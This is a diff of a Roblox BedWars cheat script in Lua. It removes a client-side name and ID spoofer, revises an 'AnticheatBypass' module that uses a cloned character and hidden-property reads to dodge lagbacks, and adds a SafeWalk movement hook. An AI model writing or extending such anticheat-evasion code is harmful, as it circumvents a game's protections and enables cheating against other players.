-	local function plrthing(obj, property, revert)
-		if (NickHider["Enabled"] or revert) and nickeduser ~= {} and nickeduser ~= nil then
-			obj[property] = obj[property]:gsub((revert and newname or lplr.Name), (revert and lplr.Name or nickeduser["Username"]))
-			obj[property] = obj[property]:gsub((revert and newdisplayname or lplr.DisplayName), (revert and lplr.DisplayName or nickeduser["DisplayName"]))
-			if property ~= "Text" then
-				obj[property] = obj[property]:gsub((revert and newid or lplr.UserId), (revert and lplr.UserId or nickeduser["Id"]))
-			end
-		end
-	end
-
-	local function newobj(v, revert)
-		if v:IsA("TextLabel") or v:IsA("TextButton") then
-			plrthing(v, "Text", revert)
-			if (not revert) then
-				table.insert(nickconnections, v:GetPropertyChangedSignal("Text"):connect(function()
-					plrthing(v, "Text", revert)
-				end))
-			end
-		end
-		if v:IsA("ImageLabel") then
-			plrthing(v, "Image", revert)
-			if (not revert) then
-				table.insert(nickconnections, v:GetPropertyChangedSignal("Image"):connect(function()
-					plrthing(v, "Image", revert)
-				end))
-			end
-		end
-	end
-
-	NickHider = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
-		["Name"] = "NickHider",
-		["Function"] = function(callback)
-			if callback and nickeduser ~= {} and nickeduser ~= nil and NickHiderBox["Value"] ~= "" then
-			--[[	if not OldNameCall then
-					OldNameCall = hookmetamethod(game, "__namecall", function(...)
-						local Args = {...}
-						local NamecallMethod = getnamecallmethod()
-					
-						if not checkcaller() and #Args >= 2 and Args[1] == textservice and NamecallMethod == "GetTextSize" and NickHider["Enabled"] and nickeduser ~= {} and nickeduser ~= nil then
-							Args[2] = Args[2]:gsub(lplr.Name, nickeduser["Username"])
-							Args[2] = Args[2]:gsub(lplr.DisplayName, nickeduser["DisplayName"])
-						end
-					
-						return OldNameCall(unpack(Args))
-					end)
-				end]]
-				nickedmodel = game:GetService('Players'):GetCharacterAppearanceAsync(nickeduser.Id)
-				newname = nickeduser["Username"]
-				newdisplayname = nickeduser["DisplayName"]
-				newid = nickeduser["Id"]
-				repeat task.wait() until nickedmodel ~= nil
-				if entity.isAlive then
-					dostuff()
-				end
-				for i,v in pairs(game:GetDescendants()) do
-					newobj(v)
-				end
-				nickhidercharadded = lplr.CharacterAdded:connect(dostuff)
-				nickhiderdescendantsadded = game.DescendantAdded:connect(newobj)
-			else
-				if nickhidercharadded then
-					nickhidercharadded:Disconnect()
-				end
-				if nickhiderdescendantsadded then
-					nickhiderdescendantsadded:Disconnect()
-				end
-				if nickeduser == {} or nickeduser == nil or NickHiderBox["Value"] ~= "" then
-					createwarning("NickHider", "No User or Invalid User Id", 4)
-				end
-				nickedmodel = game:GetService('Players'):GetCharacterAppearanceAsync(lplr.UserId)
-				repeat task.wait() until nickedmodel ~= nil
-				if entity.isAlive then
-					dostuff()
-				end
-				for i2,v2 in pairs(nickconnections) do
-					v2:Disconnect()
-				end
-				for i,v in pairs(game:GetDescendants()) do
-					newobj(v, true)
-				end
-			end
-		end,
-		["HoverText"] = "Disguises as the UserId in the text box (Client Side)"
-	})
-	NickHiderBox = NickHider.CreateTextBox({
-		["Name"] = "UserBox",
-		["TempText"] = "User (userid)",
-		["FocusLost"] = function()
-			local success, result = pcall(function()
-				return game:GetService("UserService"):GetUserInfosByUserIdsAsync({ tonumber(NickHiderBox["Value"]) })
-			end)
-			 
-			if success and #result > 0 then
-				nickeduser = result[1]
-				if NickHider["Enabled"] then
-					NickHider["ToggleButton"](true)
-					NickHider["ToggleButton"](true)
-				end
-			else
-				if NickHider["Enabled"] then
-					createwarning("NickHider", "Invalid User Id", 4)
-				end
 			end
 		end
 	})
@@ -8272,25 +8146,29 @@ runcode(function()
 			bedwars["BalloonController"].hookBalloon = oldballoon
 			oldballoon = nil
 		end
-		if lplr.Character then
+		if lplr.Character and lplr.Character ~= clone then
 			oldchar = lplr.Character
 			oldchar.Archivable = true
-			anticheatconnection3 = oldchar:WaitForChild("InventoryFolder", 20):GetPropertyChangedSignal("Value"):connect(function()
-				if clone:FindFirstChild("InventoryFolder") then
-					clone.InventoryFolder.Value = oldchar.InventoryFolder.Value
-				end
-			end)
-			anticheatconnection4 = oldchar:WaitForChild("ObservedChestFolder", 20):GetPropertyChangedSignal("Value"):connect(function()
-				if clone:FindFirstChild("ObservedChestFolder") then
-					clone.ObservedChestFolder.Value = oldchar.ObservedChestFolder.Value
-				end
+			pcall(function()
+				anticheatconnection3 = oldchar:WaitForChild("InventoryFolder", 20):GetPropertyChangedSignal("Value"):connect(function()
+					if clone:FindFirstChild("InventoryFolder") then
+						clone.InventoryFolder.Value = oldchar.InventoryFolder.Value
+					end
+				end)
+				anticheatconnection4 = oldchar:WaitForChild("ObservedChestFolder", 20):GetPropertyChangedSignal("Value"):connect(function()
+					if clone:FindFirstChild("ObservedChestFolder") then
+						clone.ObservedChestFolder.Value = oldchar.ObservedChestFolder.Value
+					end
+				end)
 			end)
 			clone = oldchar:Clone()
 			local clonevar = Instance.new("IntValue")
 			clonevar.Name = "ClonedCharacter"
 			clonevar.Parent = clone
 			clone.Parent = workspace
-			clone.HumanoidRootPart.CFrame = oldchar.HumanoidRootPart.CFrame 
+			if clone:FindFirstChild("HumanoidRootPart") and oldchar:FindFirstChild("HumanoidRootPart") then 
+				clone.HumanoidRootPart.CFrame = oldchar.HumanoidRootPart.CFrame 
+			end 
 			local balloonroot = Instance.new("Part")
 			balloonroot.Transparency = 1
 			balloonroot.Anchored = true
@@ -8330,14 +8208,14 @@ runcode(function()
 			lplr:Move(Vector3.new(0, 0, 0), false)
 			changed = true
 			local oldcamcframe = cam.CFrame
-			if clone:FindFirstChild("HumanoidRootPart") then 
+			if clone:FindFirstChild("HumanoidRootPart") and oldchar:FindFirstChild("HumanoidRootPart") then 
 				clone.HumanoidRootPart.CFrame = oldchar.HumanoidRootPart.CFrame 
-			end 
+			end
 			repeat 
 				task.wait() 
-				if clone:FindFirstChild("HumanoidRootPart") then 
+				if clone:FindFirstChild("HumanoidRootPart") and oldchar:FindFirstChild("HumanoidRootPart") then 
 					clone.HumanoidRootPart.CFrame = oldchar.HumanoidRootPart.CFrame 
-				end 
+				end
 				if networkownerfunc == nil and gethiddenproperty(oldchar.HumanoidRootPart, "NetworkOwnershipRule") == Enum.NetworkOwnership.Manual then
 					if lagbackcurrent == false then
 						lagbacknum = tick() + 8
@@ -8430,7 +8308,7 @@ runcode(function()
 							oldchar.HumanoidRootPart.Velocity = clone.HumanoidRootPart.Velocity
 						else
 							--local targetvelo = (targetstrafing and (oldchar.HumanoidRootPart.CFrame.p - clone.HumanoidRootPart.CFrame.p) or clone.HumanoidRootPart.Velocity)
-							local targetvelo = clone.HumanoidRootPart.Velocity
+							local targetvelo = (clone.HumanoidRootPart.Velocity)
 							targetvelo = targetvelo.Unit * 20
 							oldchar.HumanoidRootPart.Velocity = Vector3.new(math.clamp(targetvelo.X, -20, 20), clone.HumanoidRootPart.Velocity.Y, math.clamp(targetvelo.Z, -20, 20))
 						end
@@ -8472,12 +8350,12 @@ runcode(function()
 									lagbackchanged = true
 									lagbacktime = tick()
 									spawn(function()
-										createwarning("AnticheatBypass", "Ping: "..tostring(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()), 10)
+										createwarning("AnticheatBypass", "Ping: "..tostring(math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))), 10)
 									end)
 								end
 								if (tick() - lagbacktime) >= 10 and (not lagbacknotification) then
 									lagbacknotification = true
-									createwarning("AnticheatBypass", "You have been lagbacked for a awfully long time", 10)
+									createwarning("AnticheatBypass", "You have been lagbacked for a \nawfully long time", 10)
 								end
 								--print(longjumpvelo,clone.HumanoidRootPart.CFrame.p,clone.HumanoidRootPart.Velocity)
 								clone.HumanoidRootPart.CFrame = oldchar.HumanoidRootPart.CFrame
@@ -8551,9 +8429,39 @@ runcode(function()
 						end
 					end
 				end)
-				repeat task.wait() until entity.isAlive
 				if lplr.Character ~= clone then
-					spawn(disablestuff)
+					spawn(function()
+						repeat task.wait() until entity.isAlive
+						lplr.Character:WaitForChild("Humanoid", 10)
+						lplr.Character:WaitForChild("LeftHand", 10)
+						lplr.Character:WaitForChild("RightHand", 10)
+						lplr.Character:WaitForChild("LeftFoot", 10)
+						lplr.Character:WaitForChild("RightFoot", 10)
+						lplr.Character:WaitForChild("LeftLowerArm", 10)
+						lplr.Character:WaitForChild("RightLowerArm", 10)
+						lplr.Character:WaitForChild("LeftUpperArm", 10)
+						lplr.Character:WaitForChild("RightUpperArm", 10)
+						lplr.Character:WaitForChild("LeftLowerLeg", 10)
+						lplr.Character:WaitForChild("RightLowerLeg", 10)
+						lplr.Character:WaitForChild("LeftUpperLeg", 10)
+						lplr.Character:WaitForChild("RightUpperLeg", 10)
+						lplr.Character:WaitForChild("UpperTorso", 10)
+						lplr.Character:WaitForChild("LowerTorso", 10)
+						local root = lplr.Character:WaitForChild("HumanoidRootPart", 20)
+						local head = lplr.Character:WaitForChild("Head", 20)
+						task.wait(0.4)
+						if root ~= nil and head ~= nil then
+							if changed == false then
+								if lplr.Character ~= clone and lplr.Character:FindFirstChild("ClonedCharacter") == nil then
+									spawn(disablestuff)
+								end
+							else
+								changed = false
+							end
+						else
+							createwarning("AnticheatBypass", "ur root / head no load L", 30)
+						end
+					end)
 				end
 				anticheatconnection = lplr.CharacterAdded:connect(function(char)
 					spawn(function()
@@ -8574,7 +8482,7 @@ runcode(function()
 						char:WaitForChild("LowerTorso", 10)
 						local root = char:WaitForChild("HumanoidRootPart", 20)
 						local head = char:WaitForChild("Head", 20)
-						task.wait(0.2)
+						task.wait(0.4)
 						if root ~= nil and head ~= nil then
 							if changed == false then
 								if char ~= clone and char:FindFirstChild("ClonedCharacter") == nil then
@@ -8584,7 +8492,7 @@ runcode(function()
 								changed = false
 							end
 						else
-							createwarning("AnticheatBypass", "ur root no load L", 30)
+							createwarning("AnticheatBypass", "ur root / head no load L", 30)
 						end
 					end)
 				end)
@@ -8849,5 +8757,36 @@ runcode(function()
 				end
 			end
 		end
+	})
+end)
+
+GuiLibrary["RemoveObject"]("SafeWalkOptionsButton")
+runcode(function()
+	local controlmodule = require(lplr.PlayerScripts.PlayerModule).controls
+	local oldmove
+	local SafeWalk = {["Enabled"] = false}
+	SafeWalk = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
+		["Name"] = "SafeWalk",
+		["Function"] = function(callback)
+			if callback then
+				oldmove = controlmodule.moveFunction
+				controlmodule.moveFunction = function(Self, vec, facecam)
+					if entity.isAlive then
+						local raycastparameters = RaycastParams.new()
+						raycastparameters.FilterDescendantsInstances = {game:GetService("CollectionService"):GetTagged("block")}
+						raycastparameters.FilterType = Enum.RaycastFilterType.Whitelist
+						local ray = workspace:Raycast(lplr.Character.HumanoidRootPart.Position + vec, Vector3.new(0, -1000, 0), raycastparameters)
+						local ray2 = workspace:Raycast(lplr.Character.HumanoidRootPart.Position, Vector3.new(0, -lplr.Character.Humanoid.HipHeight * 2, 0), raycastparameters)
+						if ray == nil and ray2 then
+							vec = Vector3.new(0, 0, 0)
+						end
+					end
+					return oldmove(Self, vec, facecam)
+				end
+			else
+				controlmodule.moveFunction = oldmove
+			end
+		end,
+		["HoverText"] = "lets you not walk off because you are bad"
 	})
 end)
